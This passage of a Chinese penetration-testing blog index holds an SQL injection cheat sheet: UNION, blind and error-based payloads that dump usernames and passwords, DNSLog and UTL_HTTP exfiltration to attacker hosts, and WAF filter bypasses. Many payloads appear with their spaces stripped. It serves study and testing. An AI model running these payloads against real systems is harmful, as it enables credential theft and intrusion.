中，等号两边如果类型不一致，则会发生强制转换。当数字与字符串数据比较时，字符串将被转换为数字，再进行比较。字符串 1 与数字相等；字符串 1a 被强制转换成 1，与 1 相等；字符串 a 被强制转换成 0 所以与 0 相等。 按照这个特性，我们容易判断输入点是否为字符型，也就是是否有引号（可能是单引号也可能是双引号，绝大多数情况下是单引号）包裹。访问 ?id=3-2，页面为空，不是数字型，可能是字符型。继续尝试访问 ?id=2a，成功返回结果，说明是字符型。 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:3:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"3.3 SQL 数据库的类型 3.3.1 通过报错信息 MySQL you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near ” at line x Access Microsoft JET Database… MSSQL Microsoft ODBC Database… 3.3.2 数据库标志性信息 sql server：select @@version-- Oracle：select banner from v$version mysql：select @@version，version()-- ，length(user)\u003e0正常 postgresql：select version()-- 3.3.3 数据库特有库名 MySQL：information_schema Access：mysysobjects Oracle：sys.user_tables MSSQL：sysobjects 3.3.4 数据库特有函数 sql server：@@pack_received @@rowcount mysql：connection_id()、last_insert_id()、row_count() orcale：bitand(1,1) postgresql： select extract(dow from now()) 在 mssql 中可以调用 substring。oracle 则只可调用 substr 3.3.5 字符串处理方式 mssql：id=1 and 'a'+'b'='ab' mysql：id=1 and 'a'+'b'='ab' ， 'ab'=concat('a','b') oracle：id=1 and 'a'+'b'='a'||'b' ，'ab'=concat('a','b') postgresql：id=1 and 'a'+'b'='a'||'b' ,'ab'=concat('a','b') 3.3.6 特殊符号及注释 null 和 %00 是 access 支持的注释 # 是 MySQL 中的注释符，返回错误说明该注入点可能不是 MySQL，另外也支持-- ，和 /* */ 注释 -- 和 /* */ 是 Oracle，SQL server 和 MySQL 支持的注释符，如果正常，说明可能就是这三个数据库其中之一。 ; 是子句查询标识符，在 Oracle 中不支持多行查询，返回错误，很可能是 Oracle 数据库。 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:3:3","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"4 UNION 联合查询注入 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:4:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"4.1 原理 union 操作符用于合并两个查询或者多个 select 语句的结果集 信息 UNION 内部的 select 语句必须有相同数量的列。 通过 UNION 联合查询，直接将查询的结果返回给页面，是最简单的一种注入方式。 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:4:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"4.2 常用语句 //库名unionselect1,group_concat(schema_name),3frominformation_schema.schemataunionselect1,(selectschema_namefrominformation_schema.schematalimit0,1),3//表名unionselect1,group_concat(table_name),3frominformation_schema.tableswheretable_schema='security'//列名unionselect1,group_concat(column_name),3frominformation_schema.columnswheretable_schema='security'andtable_name='emails'//数据unionselect1,group_concat(id,email_id),3fromsecurity.emails ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:4:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"5 时间型盲注 \u0026 布尔型盲注 盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。 时间型：通过注入特定语句，根据页面请求的物理反馈，来判断是否注入成功，如：在 SQL 语句中使用 sleep() 函数看加载网页的时间来判断注入点。 布尔型：页面只返回 True 和 False 两种状态(类型)页面。利用页面返回不同，逐个猜解数据。 适用场景：通常无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知。 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:5:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"5.1 原理示意 select * from user where id = '?' ? 为用户输入，替代为：4' and sleep(3)# 实际执行的 SQL 语句：select * from user where id = '4' and sleep(3)# 当 ID = 4 存在时，sleep 3 秒 当 ID = 4 不存在时，直接返回 整条拼接出来的 SQL 是正确的就执行 sleep，前面错误（不存在），sleep(3) 不执行 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:5:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"5.2 常用函数 5.2.1 编码转换函数 ord('a')：将字符转化为 ascii 码 ascii('a')：将字符转化为 ascii 码 char(97)：将 ascii 转化为字符 5.2.2 条件判断函数 if(exp1, exp2, exp3)：exp1 成立，执行 exp2，否则执行 exp3。 case when then 函数：select case when username=\"admin\" then sleep(1) else \"error\" end from wp_user_ 5.2.3 截取函数 substr 函数 substr(str, pos, len)：从 pos 位置开始，截取字符串 str 的 len 长度 substr(str from pos for length) ：可以用在过滤了 , 的情况 substring 函数 substring(str, pos, len)：从 pos 位置开始，截取字符串 str 的 len 长度 substring(str from pos for length) ：可以用在过滤了 , 的情况 注意：pos 从 1 开始 id=1andif(ord(substr(database(),1,1))=116,1,0)%23selectsubstring(database(),from1for1)selectsubstring(database(),0,1) mid 函数 mid(str, pos, length) mid(str from pos for length) selectmid(database(),from1for1)selectmid(database(),1,1) left 函数 从左开始截取字符串 left(str, len) selectleft(database(),1) right 函数 从右开始截取字符串 right(str, len) 利用正则表达式逐位匹配 select*fromwp_user_wherepasswordrlike\"^1\"select*fromwp_user_wherepasswordREGEXP\"^1\"select*fromwp_user_wherepasswordREGEXP\"^12\"... 5.2.4 延时函数 sleep(n)：程序挂起 n 秒 if(ascii(substr(database()from0))=97,sleep(3),0) benchmark(count, sha(1))：执行 sha(1) 函数 count 次达到延时的目的 SELECTBENCHMARK(10000000,sha(1)) 利用笛卡尔积制造延时： SELECTcount(*)frominformation_schema.columnsA,information_schema.columnsB,information_schema.tablesC; 利用正则表达式匹配长字符串制造延时： select*fromwp_user_whereid=1andIF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'))RLIKE'(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) 5.2.5 其它函数 count()：计算总数 length()：返回字符串的长度 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:5:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"6 报错型注入 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:6:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"6.1 原理 用于使用 SQL 语句报错的语法，用于注入结果无回显，但显示错误信息有输出的情况 返回的信息即是攻击者需要的信息 MySQL 报错注入主要分为以下几类： BigInt 等数据类型溢出 Xpath 语法错误 count() + rand() + group by 导致主键重复 空间数据类型函数错误 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:6:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"6.2 常用函数 6.2.1 updatexml updatexml 第二个参数需要传入的是 Xpath 格式的字符串。输入不符合，将参数值返回并报错。 报错长度最大为 32 位 //显示当前数据库updatexml(1,CONCAT(0x7e,database()),1)//显示所有数据库updatexml(1,CONCAT(0x7e,(selectschema_nameFROMINFORMATION_SCHEMA.SCHEMATAlimitx,1),0x7e),1)//获取表名updatexml(1,CONCAT(0x7e,(selecttable_namefrominformation_schema.tableswheretable_schema=\"sectest\"limitx,1),0x7e),1)updatexml(1,make_set(3,'~',(selectgroup_concat(table_name)frominformation_schema.tableswheretable_schema=database())),1)//获取列名updatexml(1,CONCAT(0x7e,(selectcolumn_namefrominformation_schema.COLUMNSwheretable_name=\"wp_user_\"limit1,1),0x7e),1)updatexml(1,make_set(3,'~',(selectgroup_concat(column_name)frominformation_schema.columnswheretable_name=\"users\")),1)//获取数据updatexml(1,CONCAT(0x7e,(selectusernamefromwp_user_limit0,1),0x7e),1)updatexml(1,CONCAT(0x7e,(selectpasswordfromwp_user_whereusername=\"admin\"limit0,1),0x7e),1)updatexml(1,CONCAT(0x7e,(selectGROUP_CONCAT(username,0x3a,password)fromwp_user_whereid=1),0x7e),1)updatexml(1,make_set(3,'~',(selectdatafromusers)),1)# 6.2.2 floor 显错注入 and(select1from(selectcount(*),concat(user(),floor(rand(0)*2))xfrominformation_schema.tablesgroupbyx)a)and(select1from(selectcount(*),concat((selectgroup_concat(username,0x3a,password)fromwp_user_whereid=1),floor(rand(0)*2))xfrominformation_schema.tablesgroupbyx)a) 6.2.3 其它显错注入 andextractvalue(1,concat(0x7e,(selectdatabase())))//1105-XPATHsyntaxerror:'~sectest',Time:0.000000sandexp(~(select*from(selectuser())a))//mysql5unionselect*from(selectNAME_CONST(version(),1),NAME_CONST(version(),1))a;//1060-Duplicatecolumnname'5.7.23',Time:0.000000s 6.3 Demo http://ctf5.shiyanbar.com/web/baocuo/index.php payload updatexml(1,concat(0x7e,(version())),0)http://ctf5.shiyanbar.com/web/baocuo/index.php$sql=\" select * from users where username='' and updatexml /*' and password='*/(1,concat(0x7e,(version())),0) or '1' \" ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:6:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"7 堆叠注入 一堆 SQL 语句(多条)一起执行 在 MySQL 中，主要是命令行中，每条语句结尾加 ; 表示语句结束。这样可以考虑多条 SQL 语句一起使用 问题 堆叠注入和 UNION 注入的差别是？ UNION 执行的语句类型是有限的，只可以用来执行查询语句 而堆叠注入可以执行任意语句 注意：场景少；但是威力大 并不是每一个环境下都可以执行，很可能受 API 或者数据库引擎不支持的限制，同时权限不足也是面临的主要问题 在真实环境中： 通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的 在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息 在 PHP - MySQL 中相关的 API $query = \"SELECT CURRENT_USER();\"; $query .= \"SELECT Name FROM City ORDER BY ID LIMIT 20, 5\"; /* 批量执行查询 */ if ($mysqli-\u003emulti_query($query)) { do { /* store first result set */ if ($result = $mysqli-\u003estore_result()) { while ($row = $result-\u003efetch_row()) { printf(\"%s\\n\", $row[0]); } $result-\u003efree(); } /* print divider */ if ($mysqli-\u003emore_results()) { printf(\"-----------------\\n\"); } } while ($mysqli-\u003enext_result()); } ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:7:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"8 OOB 注入 攻击类别 SQL 注入类型 说明 INBAND 报错注入、UNION 注入 在应用内直接获取数据，通用过应用返回或者报错直接提取数据 INFERENCE 布尔注入、时间盲注 通过应用的非直接数据反馈进行推断 OUT OF BAND OOB SQL 注入 通过其它信道获取数据 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"8.1 带外通道技术定义 - Out Of Band 带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用没有直接回显的漏洞。 这一类漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。 带外通道技术通常需要脆弱的实体来生成带外的 TCP/UDP/ICMP 请求，然后，攻击者可以通过这个请求来提取数据。 一次成功的 OOB 攻击是基于： 存在漏洞的系统 外围防火墙的出站请求 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"8.2 OOB vs. X 8.2.1 OOB vs. Inband 常规通信信道 非应用内信道 8.2.2 OOB vs. Time-based Blind Injection 可以看作是另一种盲注技术 与盲注相比，速度具有优势，因为其实际上实现了变相的回显 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"8.3 OOB 利用函数 - load_file 函数 load_file 函数是 MySQL 中一个常用的函数，主要用来读取文件内容。 函数原型：load_file(file_path) 该函数会读取文件内容，并将文件内容作为字符串返回。如果读取失败会返回 null 信息 该函数在执行过程中需要遵循 secure_file_priv 的限制，如果直接执行，在读取目标文件内容时会失败。 secure_file_priv 变量的值为 /var/lib/mysql-files，因此 load_file() 函数只能够去读该目录下的文件内容 注意 如果想完成任意目录下文件读取需要在 /etc/my.conf(my.ini) 中将 secure_file_priv 的值置为空 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:3","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"8.4 OOB 注入原理 在 windows 下，利用 load_file 函数可以读取 UNC 路径的特性，把注入产生的信息来放到 UNC 地址中，通过 DNSLog，将数据带出 示例 select load_file(concat(\"\\\\\\\\\", (select database()), “.xxx.ceye.io\\\\abc”)) ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:4","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"8.5 扩展 - 大文本传输 域名长度限制 域名由标签组成，以 . 分割，标签的长度不可以超过 63 个字符 整个域名不可以超过 253 个字符，包括 . 思路 使用 load_file 读取文件内容 使用 substr 对文件内容进行切片 使用 to_base64 对切片的内容进行编码 使用 concat 将编码后的内容与域名进行拼接 使用 load_file 访问该 UNC selectconcat(to_base64(substr(load_file(\"xxx\"),1,15)),\"dnslog.com\")asresult 技巧 oracle 数据库中，存在发起 HTTP 请求的函数 UTL_HTTP.request UTL_HTTP.request(url, proxy) 它的返回类型是长度为 2000 或更短的字符串，它包含从 HTTP 请求返回到参数 URL 的 HTML 结果的前 2000 个字节 通过 SQL 注入让目标服务器执行： select UTL_HTTP.request('http://IP/test.php'||'?id='||(select version from v$instance)) from dual; 在攻击人员的 test.php 上记录 id 参数传递过来的数据，并写入文件中 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:5","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9 WAF 绕过 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9.1 and 和 or 绕过 过滤代码：preg_match('/(and|or)/i', $id) 绕过：利用 || 代替 or，\u0026\u0026 代替 and ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9.2 union 过滤绕过 过滤代码：preg_match('/(and|or|union)/i', $id) 绕过： ||(selectuserfromuserswhereuser_id=1)='admin' 问题 怎么知道 user 表、user 列、admin 字段？ 表名确实可以猜解，尤其是 user 这种常用表 如果猜不到，通过 information_schema.tables 及 substr 来联合判断 列名和字段内容也是同理 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9.3 where 过滤绕过 过滤代码：preg_match('/(and|or|union|where)/i', $id) 绕过：|| (select user from users limit 1,1)='admin' ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:3","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9.4 limit 过滤绕过 过滤代码：preg_match('/(and|or|union|where|limit)/i', $id) 绕过：|| (select min(user) from group by user_id having user_id=1 ='admin' ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:4","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9.5 group by 过滤绕过 过滤代码：preg_match('/(and|or|union|where|limit|group by)/i', $id) 绕过： ||(selectsubstr((selectgroup_concat(name)namefromtest),1,1))='t' ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:5","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9.6 select 及单引号过滤绕过 过滤代码：preg_match('/(and|or|union|where|limit|group by|select|\\')/i', $id) 绕过： 布尔盲注不需要 select ||substr(name,1,1)=0x74||substr(name,1,1)=unhex(74) ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:6","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9.7 hex、unhex 及 substr 过滤绕过 - binary 过滤代码：preg_match('/(and|or|union|where|limit|group by|select|\\'|hex|unhex|substr)/i', $id) 绕过： ||binary(name)=0x74657374 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:7","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9.8 空格过滤绕过 过滤代码：preg_match('/(and|or|union|where|limit|group by|select|\\'|hex|unhex|substr|\\s)/i', $id) 绕过：注释符代替空格 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:8","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9.9 等号过滤绕过 过滤代码：preg_match('/(and|or|union|where|limit|group by|select|\\'|hex|unhex|substr|\\s| =)/i', $id) 绕过：利用 like、rlike、regexp、!(username\u003c\u003e\"admin\")(table_name\u003c\u003e'ffll44jj') 代替等号 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:9","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"9.10 其它类型的绕过 双写绕过 双重编码绕过 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:10","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"10 二次注入 问题 用户传递给 WEB 应用的数据不可信，数据库中的数据是否可信？ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:10:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"10.1 原理 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:10:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"11 基于约束的 SQL 攻击 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:11:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"11.1 原理 在 INSERT 中，SQL 会根据 varchar(n) 来限制字符串的最大长度。如果字符串的长度大于 n 个字符的话，那么仅使用字符串的前 n 个字符。 在 SQL 中执行字符串处理时，字符串末尾的空格符将会被删除(结合上面的这里应该就可以构造出payload了)。但也有特殊情况，比如 LIKE。 问题 假设现在数据库的一个表里已经有了 admin 用户，且用户名 varchar(30) 再插入一个 admin(25个空格) 1 因为限制长度 30 位，所以会只存入前 30 位 这样就可以创建 admin 用户 insertintouservalues('admin 长度超过表字段的限制被截断 1','pass'); ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:11:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"11.2 实例 尝试注册新用户，发现只有 admin 才能获取 flag： 通过注册页面发现 admin 用户已存在： 在 burpsuite 中修改注册数据包，将 username 字段改为如图所示的空格 + 字符的形式： 以 admin 身份登录，获取 flag： ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:11:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"12 SQL 注入命令执行 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:12:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"12.1 SQL 注入写文件 通过 